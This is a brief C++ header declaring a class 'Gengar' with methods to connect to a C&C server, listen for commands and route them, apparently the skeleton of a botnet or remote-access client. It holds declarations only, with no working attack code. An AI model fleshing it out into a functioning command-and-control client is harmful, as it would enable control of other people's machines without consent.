#pragma once
#include <string>
#include "machine.h"
#include "client.h"

class Gengar
{
private:
	Machine m_machine;
	Client m_client;
	void RouteCommand(json);

public:
	void ConnectToCnc();
	void ListenForCommand();
};

